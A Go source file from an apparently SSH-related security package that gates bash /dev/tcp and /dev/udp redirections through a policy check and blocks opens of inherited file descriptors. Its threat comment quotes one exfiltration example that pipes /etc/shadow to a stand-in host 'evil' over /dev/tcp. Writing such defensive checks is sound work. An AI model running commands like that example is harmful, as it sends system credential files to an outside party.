package security

// Threats:
//   Protects against unaudited network egress via shell redirection (SEC-1):
//   bash's `/dev/tcp/host/port` and `/dev/udp/host/port` devices, e.g.
//   `cat /etc/shadow > /dev/tcp/evil/443`. Every such redirection is refused in
//   restricted mode, otherwise policy-evaluated, change-management and four-eyes
//   gated and audited as a command named /dev/tcp (or /dev/udp) with args
//   [host, port], and only dialed (with a timeout) once the gate allows it.
//   Malformed or non-canonical device paths are rejected before the gate.
//   Also protects against forging frames into inherited descriptors (in the
//   SSH session child fd 3 is the policy-monitor socket): opens of /dev/fd/N,
//   /proc/<pid|self|thread-self>/fd/N and /proc/<pid>/task/<tid>/fd/N for any
//   N >= 3 are a hard deny with no policy call, in every mode; 0, 1, 2 and
//   /dev/stdin|stdout|stderr are unchanged.
//   Does NOT cover: DNS resolution of the host (resolution happens inside Dial;
//   policy sees the name, not the resolved address), a user-created symlink to
//   a descriptor path (the lexical fd check does not follow links), or process
//   substitution.

import (
	"context"
	"fmt"
	"io"
	"net"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"mvdan.cc/sh/v3/interp"
)

// netDialTimeout bounds how long a gated /dev/tcp or /dev/udp dial may take.
const netDialTimeout = 10 * time.Second

// OpenInterceptorSession returns the gated shell OPEN handler for the
// process-global default engine bound to a specific session's state.
func OpenInterceptorSession(sess *SessionState) interp.OpenHandlerFunc {
	return defaultEngine.OpenHandlerSession(sess)
}

// OpenHandlerSession returns the shell OPEN handler for this engine bound to a
// specific session's state. Redirections to `/dev/tcp/host/port` and
// `/dev/udp/host/port` are authorized through the same gate as a command named
// /dev/tcp (or /dev/udp) before any connection is made; every other path is
// opened by mvdan's default open handler. A nil receiver uses the
// process-global default engine, matching the call-gate fallback at runner
// sites, so no caller can obtain an ungated open handler.
func (e *Engine) OpenHandlerSession(sess *SessionState) interp.OpenHandlerFunc {
	if e == nil {
		e = defaultEngine
	}
	defaultOpen := interp.DefaultOpenHandler()
	return func(ctx context.Context, path string, flag int, perm os.FileMode) (io.ReadWriteCloser, error) {
		resolved := resolveOpenPath(ctx, path)
		if fd, ok := descriptorPath(resolved); ok && fd >= 3 {
			return nil, fmt.Errorf("adssh: fd redirection to descriptor %d is not permitted", fd)
		}
		network, host, port, isNet, err := parseNetDevice(path, resolved)
		if !isNet {
			return defaultOpen(ctx, path, flag, perm)
		}
		if err != nil {
			return nil, err
		}
		restricted := false
		var sessionID string
		if sess != nil {
			restricted = sess.Restricted
			sessionID = sess.gateSessionID()
		}
		if restricted {
			return nil, fmt.Errorf("adssh: restricted: network redirection to /dev/%s is not allowed", network)
		}
		if err := e.gateCommand(restricted, []string{"/dev/" + network, host, port}, sessionID); err != nil {
			return nil, err
		}
		dialer := net.Dialer{Timeout: netDialTimeout}
		return dialer.DialContext(ctx, network, net.JoinHostPort(host, port))
	}
}

// parseNetDevice reports whether path names a /dev/tcp or /dev/udp device and,
// if so, strictly parses it as exactly `/dev/<net>/<host>/<port>` with a
// non-empty host and a decimal port in 1..65535. A path that only resolves to
// such a device after cleaning or joining with the working directory (e.g.
// `/dev/./tcp/...` or `tcp/...` from /dev) is treated as a device and rejected
// as malformed, so no spelling reaches the default open handler or Dial.
func parseNetDevice(path, resolved string) (network, host, port string, isNet bool, err error) {
	for _, n := range []string{"tcp", "udp"} {
		dev := "/dev/" + n
		if !strings.HasPrefix(path, dev+"/") && resolved != dev && !strings.HasPrefix(resolved, dev+"/") {
			continue
		}
		bad := fmt.Errorf("adssh: invalid network device path %q: want /dev/%s/host/port", path, n)
		if resolved == dev && !strings.HasPrefix(path, dev+"/") {
			// A bare "/dev/tcp" is not a bash network device; leave it to the
			// filesystem like bash does.
			return "", "", "", false, nil
		}
		if !strings.HasPrefix(path, dev+"/") {
			return n, "", "", true, bad
		}
		parts := strings.Split(strings.TrimPrefix(path, dev+"/"), "/")
		if len(parts) != 2 || parts[0] == "" || !validPort(parts[1]) {
			return n, "", "", true, bad
		}
		return n, parts[0], parts[1], true, nil
	}
	return "", "", "", false, nil
}

// resolveOpenPath returns the cleaned absolute form of path, joining a relative
// path with the runner's working directory exactly as the default handler does.
func resolveOpenPath(ctx context.Context, path string) string {
	if !filepath.IsAbs(path) {
		path = filepath.Join(interp.HandlerCtx(ctx).Dir, path)
	}
	return filepath.Clean(path)
}

// descriptorPath reports the descriptor number named by a cleaned absolute
// path of the form /dev/fd/N, /proc/<x>/fd/N or /proc/<x>/task/<y>/fd/N.
func descriptorPath(resolved string) (int, bool) {
	parts := strings.Split(strings.TrimPrefix(resolved, "/"), "/")
	var n string
	switch {
	case len(parts) == 3 && parts[0] == "dev" && parts[1] == "fd":
		n = parts[2]
	case len(parts) == 4 && parts[0] == "proc" && parts[2] == "fd":
		n = parts[3]
	case len(parts) == 6 && parts[0] == "proc" && parts[2] == "task" && parts[4] == "fd":
		n = parts[5]
	default:
		return 0, false
	}
	if n == "" || strings.Trim(n, "0123456789") != "" {
		return 0, false
	}
	fd, err := strconv.Atoi(n)
	if err != nil {
		// Too many digits to fit an int: still a descriptor path, still >= 3.
		return int(^uint(0) >> 1), true
	}
	return fd, true
}

func validPort(s string) bool {
	if s == "" || len(s) > 5 {
		return false
	}
	for _, c := range s {
		if c < '0' || c > '9' {
			return false
		}
	}
	p, err := strconv.Atoi(s)
	return err == nil && p >= 1 && p <= 65535
}
